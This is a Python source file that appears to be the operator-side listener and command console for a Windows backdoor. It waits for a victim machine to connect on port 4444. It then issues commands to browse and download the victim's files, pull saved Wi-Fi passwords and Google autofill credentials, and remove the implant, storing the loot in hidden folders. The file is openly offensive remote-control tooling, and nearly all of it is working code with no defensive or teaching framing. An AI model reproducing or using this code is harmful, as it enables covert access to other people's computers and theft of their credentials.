import socket
import subprocess
import re
import time
import socket
import sys
import os
import win32api
import win32con

def usesettings(entry):
    pos = {'listener_timeout':0,'download_folder':2, 'port_number':4}
    try:
        with open('settings.txt','r') as f:
            settings = f.readlines()
    except: 
        print('\n--> No preferred entry specified. Using default entry')
        return None

    try:
        value = settings[pos[entry]].replace(entry + ': ','').replace('\n','')
        if value != 'None':
            return value
        else:return None
    except IndexError: 
        print('\n--> No preferred entry specified. Using default entry')
        return None
    
def changesettings(ref, override):
    param = {'listener_timeout':('seconds', 0, int),'download_folder':('absolute path', 2, str),'port_number':('port', 4, int)}
    value_type = param[ref][0]
    pos = param[ref][1]
    requested_format = param[ref][2]

    if override != None:
        try:
            with open('settings.txt','r') as f:
                settings = f.readlines()

            if pos > len(settings):
                settings.extend(['\n' for i in range(pos+1 - len(settings))])
            
            settings[pos] = ref + ': ' + override + '\n'
            with open('settings.txt','w') as f:
                f.writelines(settings)
        except FileNotFoundError:
            settings = ['\n' for i in range(pos+1)]
            
            settings[pos] = ref + ': ' + override + '\n'
            with open('settings.txt','w') as f:
                f.writelines(settings)

    try:
        with open('settings.txt','r') as f:
            settings = f.readlines()

        if pos > len(settings):
            print('\n--> Current value: None')
            settings.extend(['\n' for i in range(pos+1 - len(settings))])
        else:
            entry = settings[pos].replace(ref + ': ', '')
            print(f'\n--> Current value: {entry}')
        
        while True:
            change = input(f'\n--> Input new value - type: {value_type}\n>> ')
            if (requested_format == int and change.isdigit()) or (requested_format == float and change.isnumeric()):
                break
            elif requested_format == str:
                break
            elif requested_format == bool and (change == 'True' or change == 'False'):
                break
            elif change == 'None':
                break
            else:print('--> Invalid value type. Value must match value type')

        settings[pos] = ref + ': ' + change + '\n'
        if '/' in settings[pos]:
            settings[pos] = settings[pos].replace('/','\\')
        with open('settings.txt','w') as f:
            f.writelines(settings)
    except FileNotFoundError:
        print('--> Current value: None')
        settings = ['\n' for i in range(pos+1)]

        while True:
            change = input(f'\n--> Input new value - type: {value_type}\n>> ')
            if (requested_format == int and change.isdigit()) or (requested_format == float and change.isnumeric()):
                break
            elif requested_format == str:
                break
            elif requested_format == bool and (change == 'True' or change == 'False'):
                break
            elif change == 'None':
                break
            else:print('--> Invalid value type. Value must match value type')
        
        settings[pos] = ref + ': ' + change + '\n'
        with open('settings.txt','w') as f:
            f.writelines(settings)

def getinformation():
    machine_name = subprocess.check_output(['hostname']).decode().strip()
    user = subprocess.check_output(['whoami']).decode().strip().split('\\')[-1] # get only the username
    public_ip = subprocess.check_output(['nslookup', 'myip.opendns.com.', 'resolver1.opendns.com'], stderr=subprocess.DEVNULL).decode().split()[-1]
    output = subprocess.check_output(['ipconfig'], stderr=subprocess.DEVNULL).decode()
    pattern = r'refirizzo IPv4[^:]:\s([0-9]+(?:\.[0-9]+){3})'
    matches = re.findall(pattern, output)
    private_ip = matches[-1] if matches else None
    return machine_name, user, public_ip, private_ip

def receive_data(client_socket, binary=False):
        data = b''
        marker_eos = b'-EOS'
        marker_eof = b'-EOF'
        marker = marker_eof if binary else marker_eos
        while not data.endswith(marker):
            chunk = client_socket.recv(1024)
            if not chunk:
                break
            data += chunk
        if not binary and data.endswith(marker_eos):
            output = data[:-4].decode()
        elif binary and data.endswith(marker_eof):
            output = data[:-4]
        else:
            print('Message doesn\'t appear to be a string nor a file. Maybe an error occurred')
            output = None
        return output

def send_data(client_socket, data):
        if data:
            try:
                if isinstance(data, str):
                    data += '-EOS'
                else:
                    data += b'-EOF'
                chunks = [data[i:i+1024] for i in range(0, len(data), 1024)]
                for chunk in chunks:
                    if isinstance(chunk, str):
                        chunk = chunk.encode()
                    client_socket.send(chunk)
                print(f'Sent {sys.getsizeof(data)} bytes of data\n')
            except Exception as e:
                print('Message transferring error: ', e)

local_machine_name, local_user, local_public_ip, local_private_ip = getinformation()

port = usesettings('port_number') if usesettings('port_number') else 4444
ip = socket.gethostbyname(socket.gethostname())
global sock
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def session():
    print('--> Session started...')

    send_data(client_socket, 'info')
    machine_name, user, public_ip, private_ip = receive_data(client_socket).split('|')

    if private_ip:
        targetip = '-' + private_ip
    elif not private_ip and len(public_ip) < 15:
        targetip = public_ip
    else:
        targetip = ''

    temp_path = os.path.join(os.getcwd(),f'{machine_name}-{user}{targetip}')
    if not os.path.exists(temp_path):
        os.mkdir(temp_path)
        customdir = temp_path
        attrs = win32api.GetFileAttributes(customdir)
        win32api.SetFileAttributes(customdir, attrs | win32con.FILE_ATTRIBUTE_HIDDEN)
    else: customdir = temp_path

    preferred_folder = usesettings('download_folder') if usesettings('download_folder') else customdir

    backdoor_status = True
    while backdoor_status == True:
        send_data(client_socket, 'cd')
        wd = receive_data(client_socket)
        command = input(f'>> {wd}\n>> ').strip()
        syntax = (command).split()
        cdsyn = [command[:1], command[2:]]

        if command.startswith('help'):
            rules = {'wkr':'wkr (-1/-2)\n    Flags:\n    -1 = Retrieves current network information\n    -2 = Retrieves all SSIDs and relative Passwords','echo':'echo (any word)','quit':'','gkr':'','info':'','cd':'cd (relative or absolute path)','dir':''}
            if command == 'help':
                print('\n--> help: Gives list of command and information about them. Type \"help (command)\" for further information about a specific command\n    cd: Changes victim machine\'s current working directory\n    dir: List directory content wheter it\'s file or folder along with size\n    echo: Troubleshooting purpose, (e.g. check if the victim machine is still connected) returns the same arguments submitted\n    gkr: Retrieves google "autofill" stored URLs, Usernames and Passwords\n    info: Get victim machine\'s Machine name, User, Public IP and Private IP\n    quit: Quits the listener leaving the backdoor on\n    wkr: Retrieves Wi-FI SSIDs and Passwords')
            elif len(syntax) == 2 and syntax[1] in rules:
                if rules[syntax[1]]: print('\n-->'+rules[syntax[1]])
                else: print('\n--> No further information about this command')
            else:
                print('--> Invalid Syntax. Type \"help (command)\"')

        elif command == 'info':
            print(f'--> Machine name: {machine_name}\n    User: {user}\n    Public IP Address: {public_ip}\n    Private IP Address: {private_ip}')
        
        elif command.startswith('cd') and len(cdsyn) == 2:
            send_data(client_socket, command)
            print('\n--> ' + receive_data(client_socket))

        elif command == 'dir':
            send_data(client_socket, command)
            print('\n--> ' + receive_data(client_socket).strip())
        
        elif command.startswith('download') and len(syntax) == 2:
            send_data(client_socket,command)
            file_data = receive_data(client_socket, binary=True)
            if os.path.exists(preferred_folder):
                with open(os.path.join(preferred_folder, syntax[1]),'wb') as f:
                    f.write(file_data)
            else:
                with open(os.path.join(os.getcwd(), syntax[1]),'wb') as f:
                    f.write(file_data)
        
        elif command.startswith('wkr'):
            if '-1' in command or '-2' in command:
                send_data(client_socket, command)
                print('--> Output:')
                print(receive_data(client_socket))
            else:
                print('--> Missing flag or invalid syntax. Type help (wkr)')

        elif command == 'gkr':
            send_data(client_socket, command)
            keys = receive_data(client_socket).encode()
            if os.path.exists(preferred_folder):
                pathname = os.path.join(preferred_folder, f'{machine_name} - googlekeys.txt')
                with open(pathname, 'wb') as f:
                    f.write(keys)
                print(f'--> All keys successfully stored in {pathname}')
            else:
                pathname = os.path.join(os.getcwd(), f'{machine_name} - googlekeys.txt')
                with open(pathname, 'wb') as f:
                    f.write(keys)
                print(f'--> All keys successfully stored in {pathname}')

        elif command.startswith('echo'):
            send_data(client_socket, command)
            result = receive_data(client_socket)
            print('-->',result.strip())

        elif command == 'eradicate':
            confirm = input('\n--> Are you sure you want to eradicate the backdoor from the target machine? Type \"CONFIRM\" to confirm\n>> ')
            if confirm == 'CONFIRM':
                send_data(client_socket, 'eradicate')
                print(f'\n--> {receive_data(client_socket)}')
            else:
                confirm = input('\n--> Confirmation word was incorrect. Try again. Type \"CONFIRM\" to confirm\n>> ')
                if confirm == 'CONFIRM':
                    send_data(client_socket, 'eradicate')
                    print(f'\n--> {receive_data(client_socket)}')
                else: print('\n--> Backdoor eradication failed')

        elif command == 'quit':
            client_socket.close()
            sock.close()
            print('\n--> Terminating socket...')
            time.sleep(1)
            backdoor_status = False

        else: print(f'\n--> Invalid syntax, \"{command}\" hasn\'t been recognized. Type \"help\"')
        
        if os.path.exists(customdir):
            dirfiles = os.listdir(customdir)
            if len(dirfiles) > 0:
                attrs = win32api.GetFileAttributes(customdir)
                if attrs & win32con.FILE_ATTRIBUTE_HIDDEN:
                    win32api.SetFileAttributes(customdir, attrs & ~win32con.FILE_ATTRIBUTE_NORMAL)
        else:
            os.mkdir(customdir)
            attrs = win32api.GetFileAttributes(customdir)
            win32api.SetFileAttributes(customdir, attrs | win32con.FILE_ATTRIBUTE_HIDDEN)

    if not os.listdir(customdir):
        os.rmdir(customdir)
    controller()

def controller():
    connection = False
    while True:
        prompt = input(f'\n--> Input any command. Type \"help\" for list\n{local_user}\\~$ ')
        backdoor_syntax = prompt.split()

        if prompt == 'help':
            rules = {'help':'','connect':'','start':'','settings':'settings (change) (parameter)\n    Uses:\n    settings:Lists preferred parameters that can be modified\n    settings (parameter): Shows current value of selected parameter\n    settings change (parameter): Manual input. Modifies parameter value','quit':''}
            if prompt == 'help':
                print('\n--> help: Gives list of command and information about them. Type \"help (command)\" for further information about a specific command\n    connect: Starts listening for the incoming connection and accepts it\n    start: Starts backdoor session\n    settings: Lists preferred settings values that can be modified\n    quit: Quits the program')
            elif len(backdoor_syntax) == 2 and backdoor_syntax[1] in rules:
                if rules[backdoor_syntax[1]]: print('\n--> '+rules[backdoor_syntax[1]])
                else: print('\n--> No further information about this command')
            else:
                print('--> Invalid Syntax. Type \"help (command)\"')

        elif prompt == 'connect':
            try:
                sock.bind((ip, port))
                sock.listen(1)
                print('\n--> Listening for incoming connection...')
                while True:
                    try:
                        client_socket, client_address = sock.accept()
                    except Exception as e: 
                        print('Connection failed with error', e) 
                    else:
                        print('\n--> Connection established at ', client_address)
                        break
                connection = True
            except Exception as e: print(f'\n--> Connection failed ({e})')
            

        elif prompt == 'start':
            if connection == True:
                session()
            else: print('\n--> Socket not connected. Type \"connect\"')

        elif prompt.startswith('settings'):
            if prompt == 'settings':
                print('\n--> Settings:\n    download_folder\n    listener_timeout\n    port_number')

            elif len(backdoor_syntax) == 2:
                print(f'\n--> Current value: {usesettings(backdoor_syntax[1])}')

            elif len(backdoor_syntax) == 3 and prompt.startswith('settings change'):
                match backdoor_syntax[2]:
                    case 'listener_timeout': changesettings('listener_timeout', None)
                    case 'download_folder': changesettings('download_folder', None)
                    case 'port_number': changesettings('port_number', None)
                    case other: print('\n--> Invalid entry. Type \"settings\" for list')

            else: print('\n--> Invalid syntax. Type \"help settings\"')

        elif prompt == 'quit':
            sys.exit(0)
        
        else: print('\n--> Command not recognized. Type \"help\" for list')

controller()